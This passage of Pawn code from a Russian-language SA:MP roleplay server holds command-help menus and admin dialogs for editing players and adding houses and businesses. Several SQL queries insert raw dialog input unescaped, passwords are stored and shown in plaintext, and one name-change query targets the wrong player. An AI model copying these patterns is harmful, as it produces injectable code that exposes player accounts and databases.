					if(PlayerInfo[playerid][pAdmin] >= 2) SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}/cnn /gun /skick /warn /jump /jumpcar /getstats /noooc /resetgun");
					if(PlayerInfo[playerid][pAdmin] >= 3) SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}/changecolor /clearchat /gethere /ban /fban /unwarn /adivorce /atake /res /rac");
					if(PlayerInfo[playerid][pAdmin] >= 4) SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}/veh /dveh /hp /weather /pick /dinamicskin /setfuel /unban /exchequer");
					if(PlayerInfo[playerid][pAdmin] >= 5) SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}/sethp /setam /sban /agivelic /sethp /setsatiety");
					if(PlayerInfo[playerid][pAdmin] >= 6) SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}/setskin /givegun /makeleader /settime");
					if(PlayerInfo[playerid][pAdmin] >= 6) SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}/setbizprod /setbizprice /setbizbank  /setbizmafia");
					if(PlayerInfo[playerid][pAdmin] >= 7) SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}/givemoney /resetmoney /setstats /getexchequer");
					if(PlayerInfo[playerid][pAdmin] >= 7) SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}/add /aedit /setmat /ao");
				}
			case 2:
				{
					SendClientMessage(playerid, COLOR_BLUE, "Управление домом:");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}/hpanel /spawnchange /changehouse /fixcar");
				}
			case 3:
				{
					SendClientMessage(playerid, COLOR_BLUE, "Управление бизнесом:");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}/bpanel /order /fuel /changebusines");
				}
			case 4:
				{
					SendClientMessage(playerid, COLOR_BLUE, "Управление личным транспортом:");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}/lock /carpass /fixcar /changecar /sellcar или /sellcar [id] [цена]");
				}
			case 5:
				{
					if(PlayerInfo[playerid][pJob] == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы безработный человек!");
					SendClientMessage(playerid, COLOR_BLUE, "По работе:");
					switch(PlayerInfo[playerid][pJob])
					{
					case J_BUS: SendClientMessage(playerid, COLOR_BLUE, "Водитель автобуса: {9ACD32}/route");
					case J_TAXI: SendClientMessage(playerid,COLOR_BLUE, "Водитель такси: {9ACD32}/fare");
					case J_PRODUCT: SendClientMessage(playerid,COLOR_BLUE, "Развозчик продуктов: {9ACD32}/load /plist");
					case J_FUEL: SendClientMessage(playerid, COLOR_BLUE, "Развозчик топлива: {9acd32}/flist");
					case J_MECHANIC: SendClientMessage(playerid, COLOR_BLUE, "Автомеханик: {9ACD32}/repair /refill");
					case J_TRUCKER: SendClientMessage(playerid, COLOR_BLUE, "Дальнобойщик: {9ACD32}/tskill");
					}
				}
			case 6:
				{
					SendClientMessage(playerid, COLOR_BLUE, "Лидеру:");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}/invite /uninvite /giverank /fpanel /bank");
				}
			case 7:
				{
					SendClientMessage(playerid, COLOR_BLUE, "Мерии:");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}(/r)adio (/d)epartments /gov /mpanel /exchequer /getexchequer /members");
				}
			case 8:
				{
					SendClientMessage(playerid, COLOR_BLUE, "Полиции и ФБР:");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}(/r)adio (/d)epartments (/m)egaphone /frisk /take /gov /ticket /ram");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}/cuff /uncuff /members /tazer /clear /wanted /su /arrest /putcar (/cput) /pull");
				}
			case 9:
				{
					SendClientMessage(playerid, COLOR_BLUE, "Армиям:");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}(/r)adio (/d)epartments (/m)egaphone /frisk /gov /ram");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32} /materials /members /tazer /warehouse /gate (возле ворот)");
				}
			case 10:
				{
					SendClientMessage(playerid, COLOR_BLUE, "Инструкторам:");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}(/f)amily /fb (OOC /f) /givelic /take /members");
				}
			case 11:
				{
					SendClientMessage(playerid, COLOR_BLUE, "Новостным агенствам:");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}(/f)amily /news /radio /newsbank /npanel /members /bank");
				}
			case 12:
				{
					SendClientMessage(playerid, COLOR_BLUE, "Радиостанции "Namesitet":");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}(/f)amily /members /duty");
				}
			case 13:
				{
					SendClientMessage(playerid, COLOR_BLUE, "Казино Caligula's:");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}(/f)amily /members /cinfo /deal ");
				}
			case 14:
				{
					SendClientMessage(playerid, COLOR_BLUE, "Бандам:");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}(/f)amily /fb (OOC /f) /members /robhouse /materials /setmaterials");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32} /capture /selldrugs /sellgun /sellzone /bank /warehouse");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32} /robmats (у склада армии) /hi ");
				}
			case 15:
				{
					SendClientMessage(playerid, COLOR_BLUE, "Мафиям:");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}(/f)amily /fb (OOC /f) /members /tie /untie /place /makegun /bank");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32} /warehouse /bizwar /bizlist");
				}
			case 16: cmd_farmcmd(playerid,inputtext);
			}
			cmd_mm(playerid,inputtext);
		}
	case D_UCPADMIN:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0: { format(string, 64, "Введите будущий ник для игрока: %s", PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Имя игрока", string, "Принять", "Отмена"); PlayerStats[playerid] = 1; }
			case 1: { format(string, 64, "Введите будущий пароль для игрока: %s", PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Пароль игрока", string, "Принять", "Отмена"); PlayerStats[playerid] = 2; }
			case 2: { format(string, 90, "Введите будущий уровень администратора\nдля игрока: %s", PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Уровень администратора", string, "Принять", "Отмена"); PlayerStats[playerid] = 3; }
			case 3: { format(string, 90, "Введите будущий уровень игрока\nдля игрока: %s", PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Уровень игрока", string, "Принять", "Отмена"); PlayerStats[playerid] = 4; }
			case 4: { format(string, 90, "Введите кол.во EXP для игрока: %s", PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid,D_UCPADMIN2, DIALOG_STYLE_INPUT, "Уважение игрока", string, "Принять", "Отмена"); PlayerStats[playerid] = 5; }
			case 5: { format(string, 90, "Введите будущий пол для игрока: %s", PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Пол игрока", string, "Принять", "Отмена"); PlayerStats[playerid] = 6; }
			case 6: { format(string, 90, "Введите будущий статус для игрока %s", PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid, D_UCPADMIN2, 1, "Статус игрока", string, "Принять", "Отмена"); PlayerStats[playerid] = 7; }
			case 7: { format(string, 90, "Введите кол-во очков доната\nдля игрока: %s", PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Очки доната", string, "Принять", "Отмена"); PlayerStats[playerid] = 8; }
			}
		}
	case D_UCPADMIN2:
		{
			if(!response) return true;
			switch(PlayerStats[playerid])
			{
			case 1:
				{
					if(!strlen(inputtext)) { format(string, 64, "Введите желаемый ник для игрока: %s", PlayerInfo[NameStats[playerid]][pSendername], RADIO, WEATHER); ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Имя игрока", string, "Принять", "Отмена"); return true; }
					format(query, 256, "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s'", inputtext);
					mysql_query(query);
					mysql_store_result();
					if(mysql_fetch_row(query))
					{
						format(string, 64, "Введите желаемый ник для игрока: %s", PlayerInfo[NameStats[playerid]][pSendername]);
						ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Имя игрока", string, "Принять", "Отмена");
						return SendClientMessage(playerid, COLOR_GREY, "Данное имя уже используется на сервере!");
					}
					new namepl[MAX_PLAYER_NAME+1];
					GetPlayerName(playerid,namepl,MAX_PLAYER_NAME);
					format(query,sizeof(query),"UPDATE "TABLE_ACCOUNT" SET name='%s' WHERE name='%s'",inputtext, namepl);
					mysql_query(query);
					if(GetPlayerHouse(NameStats[playerid]))
					{
						new i = GetPVarInt(NameStats[playerid], "PlayerHouse");
						strmid(HouseInfo[i][hOwner],inputtext,0,strlen(inputtext),MAX_PLAYER_NAME);
						SetHouseStr(i, "hOwner", inputtext);
					}
					if(GetPlayerBizz(NameStats[playerid]))
					{
						new i = GetPVarInt(NameStats[playerid], "PlayerBizz");
						strmid(BizzInfo[i][bOwner],inputtext,0,strlen(inputtext),MAX_PLAYER_NAME);
						SetBizzStr(i, "owner", inputtext);
						UpdateBizz(i);
					}
					SendMes(playerid, COLOR_ORANGE, "Вы сменили имя игрока %s на %s", PlayerInfo[NameStats[playerid]][pSendername], inputtext);
					SetPlayerName(NameStats[playerid],inputtext);
					GetPlayerName(NameStats[playerid],PlayerInfo[playerid][pSendername],32);
					SendMes(NameStats[playerid], COLOR_LIGHTRED, "Администратор %s сменил ваше имя игрока", PlayerInfo[playerid][pSendername]);
					SendMes(NameStats[playerid], COLOR_LIGHTRED, "Ваше новое имя игрока: {ffffff}%s", inputtext);
					SendClientMessage(NameStats[playerid], COLOR_LIGHTRED, "Рекмоендуется сделать скриншот. Клавиша: {ffffff}F8");
					SendClientMessage(NameStats[playerid], COLOR_LIGHTRED, "Пропишите свой новый ник в окне {ffffff}SA:MP");
					mysql_free_result();
					format(string, 64, "%s сменил имя на %s", PlayerInfo[NameStats[playerid]][pSendername], inputtext);
					Log("NameChange",string);
					GKick(NameStats[playerid]);
				}
			case 2:
				{
					if(!strlen(inputtext)) { format(string, 64, "Введите желаемый пароль для игрока: %s", PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Пароль игрока", string, "Принять", "Отмена");  return true;}
					format(query,sizeof(query),"UPDATE "TABLE_ACCOUNT" SET password='%s' WHERE name='%s'",inputtext, PlayerInfo[NameStats[playerid]][pSendername]);
					mysql_query(query);
					SendMes(playerid, COLOR_ORANGE, "Вы сменили пароль игрока %s на %s", PlayerInfo[NameStats[playerid]][pSendername], inputtext);
					SendMes(NameStats[playerid], COLOR_LIGHTRED, "Администратор %s сменил ваш пароль", PlayerInfo[playerid][pSendername]);
					SendMes(NameStats[playerid], COLOR_LIGHTGREEN, "Ваш новый пароль: {ffffff}%s", inputtext);
					SendClientMessage(NameStats[playerid], COLOR_LIGHTGREEN, "Рекмоендуется сделать скриншот. Клавиша: {ffffff}F8");
				}
			case 3:
				{
					if(!strlen(inputtext)) { format(string, 90, "Введите желаемый уровень администратора\nдля игрока: %s", PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Уровень администратора", string, "Принять", "Отмена");  return true; }
					if(strval(inputtext) < 0 || strval(inputtext) > 6) { format(string, 90, "Введите желаемый уровень администратора\nдля игрока: %s",PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Уровень администратора", string, "Принять", "Отмена"); return true; }
					SendMes(playerid, COLOR_ORANGE, "Вы установили уровень администратора игроку %s на %d",PlayerInfo[NameStats[playerid]][pSendername], strval(inputtext));
					SendMes(NameStats[playerid], COLOR_ORANGE, "Администратор %s установил вам уровень администратора на %d", PlayerInfo[playerid][pSendername], strval(inputtext));
					PlayerInfo[NameStats[playerid]][pAdmin] = strval(inputtext);
					format(string, 64, "%s дал админку %s (%d ранг)", PlayerInfo[playerid][pSendername], PlayerInfo[NameStats[playerid]][pSendername],strval(inputtext));
					Log("MakeAdmin",string);
				//	AdminLogged[NameStats[playerid]] = true;
					new randomadmlvl = 10000 + random(89999);
					PlayerInfo[NameStats[playerid]][pDostup] = randomadmlvl;
					if(strval(inputtext) == 0) PlayerInfo[NameStats[playerid]][pDostup] = 74663823;
					if(strval(inputtext) != 0) SendMes(NameStats[playerid],-1,"Ваш пароль от администраторской панели {F74848}%d, для авторизации введите {F74848}/aduty",randomadmlvl);
				}
			case 4:
				{
					if(!strlen(inputtext)) { format(string, 90, "Введите желаемый уровень игрока\nдля игрока: %s", PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Уровень игрока", string, "Принять", "Отмена"); return true; }
					if(strval(inputtext) < 1 || strval(inputtext) > 100) { format(string, 90, "Введите желаемый уровень игрока\nдля игрока: %s", PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Уровень игрока", string, "Принять", "Отмена"); return true; }
					SendMes(playerid, COLOR_ORANGE,"Вы установили уровень игрока %s на %d",PlayerInfo[NameStats[playerid]][pSendername], strval(inputtext));
					SendMes(NameStats[playerid], COLOR_ORANGE, "Администратор %s установил вам уровень игрока на %d", PlayerInfo[playerid][pSendername], strval(inputtext));
					PlayerInfo[NameStats[playerid]][pLevel] = strval(inputtext);
					SetPlayerScore(NameStats[playerid], PlayerInfo[NameStats[playerid]][pLevel]);
					format(string, 64, "%s дал %d уровень игроку %s", PlayerInfo[playerid][pSendername],strval(inputtext),PlayerInfo[NameStats[playerid]][pSendername]);
					Log("LevelChange",string);
				}
			case 5:
				{
					if(!strlen(inputtext)) { format(string, 90, "Введите желаемое уважение для игрока: %s",PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Уважение игрока", string, "Принять", "Отмена"); return true; }
					if(strval(inputtext) < 1 || strval(inputtext) > 1000) { format(string, 90, "Введите желаемое уважение для игрока: %s", PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid,D_UCPADMIN2, DIALOG_STYLE_INPUT, "Уважение игрока", string, "Принять", "Отмена"); return true; }
					SendMes(playerid, COLOR_ORANGE, "Вы установили exp %s на %d", PlayerInfo[NameStats[playerid]][pSendername], strval(inputtext));
					SendMes(NameStats[playerid], COLOR_ORANGE, "Администратор %s установил вам exp на %d", PlayerInfo[playerid][pSendername], strval(inputtext));
					PlayerInfo[NameStats[playerid]][pExp] = strval(inputtext);
				}
			case 6:
				{
					if(!strlen(inputtext)) { format(string, 90, "Введите желаемый пол для игрока: %s", PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Пол игрока", string, "Принять", "Отмена"); return true; }
					if(strval(inputtext) < 1 || strval(inputtext) > 2) { format(string, 90, "Введите желаемый пол для игрока: %s", PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Пол игрока", string, "Принять", "Отмена"); return true; }
					new sex[20];
					if(strval(inputtext) == 1) sex = "мужской";
					else sex = "женский";
					SendMes(playerid, COLOR_ORANGE, "Вы изменили пол игроку %s на %s",PlayerInfo[NameStats[playerid]][pSendername], sex);
					SendMes(NameStats[playerid], COLOR_ORANGE, "Администратор %s изменил ваш пол на %s",PlayerInfo[playerid][pSendername], sex);
					PlayerInfo[NameStats[playerid]][pSex] = strval(inputtext);

				}
			case 7:
				{
					if(!strlen(inputtext)) { format(string, 90, "Введите желаемый VipСтатус для игрока %s", PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid, D_UCPADMIN2, 1, "Статус игрока", string, "Принять", "Отмена"); return true; }
					if(strval(inputtext) < 0 || strval(inputtext) > 1) { format(string, 90, "Введите желаемый статус для игрока %s", PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid, D_UCPADMIN2, 1, "Статус игрока", string, "Принять", "Отмена"); return true; }
					if(strval(inputtext) == 0)
					{
						SendMes(playerid, COLOR_ORANGE, "Вы отключили VIP возможности для игрока: %s", PlayerInfo[NameStats[playerid]][pSendername]);
						SendMes(NameStats[playerid], COLOR_ORANGE, "Администратор %s отключил для вас VIP возможности", PlayerInfo[playerid][pSendername]);
						PlayerInfo[NameStats[playerid]][pVIP] = false;
					}
					if(strval(inputtext) == 1)
					{
						SendMes(playerid, COLOR_ORANGE, "Вы включили VIP возможности для игрока: %s", PlayerInfo[NameStats[playerid]][pSendername]);
						SendMes(NameStats[playerid], COLOR_ORANGE, "Администратор %s включил для вас VIP возможности", PlayerInfo[playerid][pSendername]);
						PlayerInfo[NameStats[playerid]][pVIP] = true;
					}
				}
   			case 8:
				{
					if(!strlen(inputtext)) { format(string, 90, "Введите желаемое кол-во доната для игрока: %s",PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Уважение игрока", string, "Принять", "Отмена"); return true; }
					if(strval(inputtext) < 1 || strval(inputtext) > 1000) { format(string, 90, "Введите желаемое кол-во доната для игрока: %s", PlayerInfo[NameStats[playerid]][pSendername]); ShowPlayerDialog(playerid,D_UCPADMIN2, DIALOG_STYLE_INPUT, "Уважение игрока", string, "Принять", "Отмена"); return true; }
					SendMes(playerid, COLOR_ORANGE, "Вы дали игроку %s, %d очков доната", PlayerInfo[NameStats[playerid]][pSendername], strval(inputtext));
					SendMes(NameStats[playerid], COLOR_ORANGE, "Администратор %s выдал вам %d очков доната, спасибо за помощь проекту.", PlayerInfo[playerid][pSendername], strval(inputtext));
					PlayerInfo[NameStats[playerid]][pCredits] = strval(inputtext);
			    }
			}
			PlayerStats[playerid] = 0;
		}
	case D_ADDNED:
		{
			if(response)
			{
				switch(listitem)
				{
				case 0:
					{
						new Float:X,Float:Y,Float:Z,Float:Angle;
						GetPlayerPos(playerid, X,Y,Z);
						GetPlayerFacingAngle(playerid,Angle);
						VehTest[playerid] = CreateVehicle(426, X,Y,Z, Angle, random(10), 0, 10000);
						PutPlayerInVehicle(playerid, VehTest[playerid], 0);
						SendClientMessage(playerid, COLOR_LIGHTRED, "Припаркуйте авто около будущего дома, потом введите: /tpc");
						TPC[playerid] = false;
					}
				case 1: ShowPlayerDialog(playerid, D_ADDNED+4, 2, "Добавить бизнес", "Магазин 24/7\nЗаправка\nПиццерия\nЗакусочная (Burger Shot)\nЗакусочная (Cluckin Bell)\nКлуб (Alhambra)\nКлуб (Jizzy)\nКлуб (Pig Pen)\nБар (Misty)\nАммуниция\nНовый клуб\nСТО", "Принять", "Отмена");
				case 2: ShowPlayerDialog(playerid, D_ADDNED+2, 1, "Добавить пикап", "ВАЖНО: Модель , Тип , Имя\nПРИМЕР: 1318 , 1, ПОЛИЦИЯ","Принять", "Отмена");
				case 3: ShowPlayerDialog(playerid, D_NMENU+15, 1, "Добавить транспорт", "ВАЖНО: Модель, Цвет1, Цвет2, Фракция, Статус\nПРИМЕР: 504, 1, 3, 4, 0", "Принять", "Отмена");
				case 4: ShowPlayerDialog(playerid, D_ADDNED+5, 0, "Добавить ATM", "Вы хотите начать установку банкомата?", "Да", "Нет");
				}
			}
			return true;
		}
	case D_ADDNED+1:
		{
			if(response)
			{
				new price,type, Float:x,Float:y,Float:z;
				if(sscanf(inputtext,"p<,>ii",price,type))
				{

					new string1[1000];
					strcat(string1,"НЕ ОШИБИТЕСЬ, ПРИМЕР: ЦЕНА , ТИП ИНТЕРЬЕРА: 1-35\n\nПРИМЕР: 100000, 1\n\n");
					strcat(string1,"1. [Класс: A]\t12. [Класс: C]\t23. [Класс: C]\t34. [Класс: C]\n");
					strcat(string1,"2. [Класс: C]\t13. [Класс: C]\t24. [Класс: B]\t35. [Класс: C]\n");
					strcat(string1,"3. [Класс: A]\t14. [Класс: B]\t25. [Класс: B]\t36. [Класс: L]\n");
					strcat(string1,"4. [Класс: C]\t15. [Класс: C]\t26. [Класс: E]\n");
					strcat(string1,"5. [Класс: B]\t16. [Класс: B]\t27. [Класс: E]\n");
					strcat(string1,"6. [Класс: B]\t17. [Класс: B]\t28. [Класс: E]\n");
					strcat(string1,"7. [Класс: E]\t18. [Класс: A]\t29. [Класс: C]\n");
					strcat(string1,"8. [Класс: B]\t19. [Класс: C]\t30. [Класс: A]\n");
					strcat(string1,"9. [Класс: A]\t20. [Класс: E]\t31. [Класс: C]\n");
					strcat(string1,"10. [Класс: B]\t21. [Класс: A]\t32. [Класс: C]\n");
					strcat(string1,"11. [Класс: C]\t22. [Класс: B]\t33. [Класс: E]\n");
					return ShowPlayerDialog(playerid,D_ADDNED+1,1,"Добавить дом",string1,"Выбор","Закрыть");
				}
				TOTALHOUSE++;
				GetPlayerPos(playerid,x,y,z);
				HouseInfo[TOTALHOUSE][hEntrx] = x;
				HouseInfo[TOTALHOUSE][hEntry] = y;
				HouseInfo[TOTALHOUSE][hEntrz] = z;
				switch(type)
				{
				case 1: format(string,90,"140.2660,1366.1091,1083.8594,A,5");	// [интерьер 9 звёздочный](меню) int 5
				case 2: format(string,90,"260.8800,1237.2365,1084.2578,C,9");	// [интерьер 2 звёздочный](меню) int 9
				case 3: format(string,90,"234.1541,1063.7206,1084.2123,A,6");	// [интерьер 9 звёздочный](меню) int 6
				case 4: format(string,90,"327.9864,1477.7328,1084.4375,C,15");	// [интерьер 3 звёздочный](меню) int 15
				case 5: format(string,90,"2237.5413,-1081.1516,1049.04,B,2");	// [интерьер 10 звёздочный](меню) int
				case 6: format(string,90,"24.0716,1340.1615,1084.3750,B,10");	// [интерьер 8 звёздочный](меню) int id 10
				case 7: format(string,90,"2259.5068,-1135.9337,1050.6328,D,10");	// [Интерьер 1 звёздочный](меню) int id 10
				case 8: format(string,90,"2196.8469,-1204.3524,1049.0234,B,6");	// [Интерьер 7 звёздочный](меню) int id 6
				case 9: format(string,90,"2317.7983,-1026.7651,1050.2178,A,9");	// [Интерьер 7 звёздочный](меню) int id 9
				case 10: format(string,90,"2365.3345,-1135.5907,1050.8826,B,8");	// [Интерьер 6 звёздочный](меню) int id 8
				case 11: format(string,90,"2282.8831,-1140.0713,1050.8984,C,11");	// [Интерьер 3 звёздочный](меню) int id 11
				case 12: format(string,90,"2218.3875,-1076.1580,1050.4844,C,1");	// [Интерьер 3 звёздочный](меню) int id 1
				case 13: format(string,90,"-68.8411,1351.3397,1080.2109,C,6");	// [Интерьер 2 звёздочный](меню) int id 6
				case 14: format(string,90,"-283.6001,1471.2211,1084.3750,B,15");	// [Интерьер 5 звёздочный](меню) int id 15
				case 15: format(string,90,"-42.5525,1405.6432,1084.4297,C,8");	// [интерьер 3 звёздочный](меню) int 8
				case 16: format(string,90,"83.0791,1322.2808,1083.8662,B,9");	// [интерьер 9 звёздочный](меню) int 9
				case 17: format(string,90,"447.2238,1397.2926,1084.3047,B,2");	// [интерьер 9 звёздочный](меню) int 2
				case 18: format(string,90,"235.2748,1186.6809,1080.2578,A,3");	// [интерьер 6 звёздочный](меню) int 3
				case 19: format(string,90,"226.4436,1239.9277,1082.1406,C,2");	// [интерьер 3 звёздочный](меню) int 2
				case 20: format(string,90,"244.0883,305.0291,999.1484,D,1");	// [интерьер 2 звёздочный](меню) int 1
				case 21: format(string,90,"226.2956,1114.1615,1080.9929,A,5");	// [интерьер 6 звёздочный](меню) int 5
				case 22: format(string,90,"295.2479,1472.2650,1080.2578,B,15");	// [интерьер 4 звёздочный](меню) int 15
				case 23: format(string,90,"261.1874,1284.2982,1080.2578,C,4");	// [интерьер 4 звёздочный](меню) int 4
				case 24: format(string,90,"-260.4934,1456.8430,1084.3672,B,4");	// [интерьер 8 звёздочный](меню) int 4
				case 25: format(string,90,"22.9848,1403.3345,1084.4370,B,5");	// [интерьер 5 звёздочный](меню) int 5
				case 26: format(string,90,"2468.2080,-1698.2988,1013.5078,D,2");	// [интерьер 6 звёздочный](меню) int 3
				case 27: format(string,90,"266.9498,304.9866,999.1484,D,2");	// [интерьер 3 звёздочный](меню) int 2
				case 28: format(string,90,"422.3438,2536.4980,10.0000,D,10");	// [интерьер 2 звёздочный](меню) int 1
				case 29: format(string,90,"443.4504,509.2181,1001.4195,C,12");	// [интерьер 6 звёздочный](меню) int 5
				case 30: format(string,90,"2324.3977,-1149.0601,1050.7101,A,12");	// [интерьер 4 звёздочный](меню) int 15
				case 31: format(string,90,"2807.6919,-1174.2933,1025.5703,C,8");	// [интерьер 4 звёздочный](меню) int 4
				case 32: format(string,90,"2233.6965,-1115.1270,1050.8828,C,5");
				case 33: format(string,90,"221.7789,1140.1970,1082.6094,D,4");
				case 34: format(string,90,"387.1313,1471.7137,1080.1949,C,15");
				case 35: format(string,90,"377.1231,1417.3163,1081.3281,C,15"); // [интерьер 4 звёздочный](меню) int 4
				case 36: format(string,90,"140.2660,1366.1091,1083.8594,L,5");	// [интерьер 9 звёздочный](меню) int 5
				}
				sscanf(coordh,"p<,>ffff",
				HouseInfo[TOTALHOUSE][hCarx],HouseInfo[TOTALHOUSE][hCary],HouseInfo[TOTALHOUSE][hCarz],HouseInfo[TOTALHOUSE][hCarfa]);
				sscanf(string,"p<,>fffsi",
				HouseInfo[TOTALHOUSE][hExitx],HouseInfo[TOTALHOUSE][hExity],HouseInfo[TOTALHOUSE][hExitz],
				HouseInfo[TOTALHOUSE][hDiscript],HouseInfo[TOTALHOUSE][hInt]);
				HouseInfo[TOTALHOUSE][hVirtual] = TOTALHOUSE;
				HouseInfo[TOTALHOUSE][hPrice] = price;

				strmid(HouseInfo[TOTALHOUSE][hOwner], "None", 0, strlen("None"), MAX_PLAYER_NAME);
				HouseInfo[TOTALHOUSE][hMIcon] = CreateDynamicMapIcon(HouseInfo[TOTALHOUSE][hEntrx], HouseInfo[TOTALHOUSE][hEntry], HouseInfo[TOTALHOUSE][hEntrz], 31, 0,-1,-1,-1,200.0);
				HouseInfo[TOTALHOUSE][hPickup] = CreatePickup(1273,1, HouseInfo[TOTALHOUSE][hEntrx], HouseInfo[TOTALHOUSE][hEntry], HouseInfo[TOTALHOUSE][hEntrz]);

				//HouseInfo[TOTALHOUSE][hPickupExit] = CreatePickup(19134, 1, HouseInfo[TOTALHOUSE][hExitx], HouseInfo[TOTALHOUSE][hExity], HouseInfo[TOTALHOUSE][hExitz], HouseInfo[TOTALHOUSE][hVirtual]);

				format(totalstring,512,"INSERT INTO "TABLE_HOUSE" (id,hEntrx,hEntry,hEntrz,hExitx,hExity,hExitz,carx,cary,carz,carfa,hDiscript,hPrice,hInt,hVirtual)\
				VALUES (%d,'%f','%f','%f','%f','%f','%f','%f','%f','%f','%f','%s',%d,%d,%d)",
				TOTALHOUSE,
				HouseInfo[TOTALHOUSE][hEntrx],HouseInfo[TOTALHOUSE][hEntry],HouseInfo[TOTALHOUSE][hEntrz],
				HouseInfo[TOTALHOUSE][hExitx],HouseInfo[TOTALHOUSE][hExity],HouseInfo[TOTALHOUSE][hExitz],
				HouseInfo[TOTALHOUSE][hCarx],HouseInfo[TOTALHOUSE][hCary],HouseInfo[TOTALHOUSE][hCarz],HouseInfo[TOTALHOUSE][hCarfa],
				HouseInfo[TOTALHOUSE][hDiscript],HouseInfo[TOTALHOUSE][hPrice],HouseInfo[TOTALHOUSE][hInt],HouseInfo[TOTALHOUSE][hVirtual]);
				mysql_query(totalstring);
				return SendMes(playerid,COLOR_ORANGE,"Дом N%d Успешно создаг",TOTALHOUSE);

			}
			TPC[playerid] = false;
		}
	case D_ADDNED+2:
		{
			if(!response) return true;
			new type, model, name[32], Float:x, Float:y, Float:z;
			if(sscanf(inputtext,"p<,>iis[32]",type,model,name)) return ShowPlayerDialog(playerid, D_ADDNED+2, 1, "Добавить пикап", "ВАЖНО: Модель , Тип , Имя\nПРИМЕР: 1318 , 1, ПОЛИЦИЯ","Принять", "Отмена");
			GetPlayerPos(playerid, x, y, z);
			format(coordc, sizeof(coordc), "%f, %f, %f, %d, %d, %d, %d, %s", x, y, z, model, type, GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid), name);
			SendClientMessage(playerid, COLOR_LIGHTRED, "Координаты созданы. Установите выходные координаты: /ppc");
			PPC[playerid] = true;
		}
	case D_ADDNED+4:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0: format(boordh,sizeof(boordh),"-2240.7820,137.2150,1035.4141,-2237.0664,130.2340,1035.4141,6,56,1"); // 24/7
			case 1: format(boordh,sizeof(boordh),"0.0,0.0,0.0,0.0,0.0,0.0,0,27,2"); // FUEL
			case 2: format(boordh,sizeof(boordh),"372.3061,-133.5236,1001.4922,374.7469,-119.3624,1001.4995,5,29,3");
			case 3: format(boordh,sizeof(boordh),"362.8425,-75.1392,1001.5078,377.3217,-67.8903,1001.5151,10,10,3");
			case 4: format(boordh,sizeof(boordh),"364.9063,-11.7721,1001.8516,369.6516,-6.3217,1001.8589,9,14,3");
			case 5: format(boordh,sizeof(boordh),"493.3561,-24.8449,1000.6797,499.2758,-20.7244,1000.6797,17,48,4");
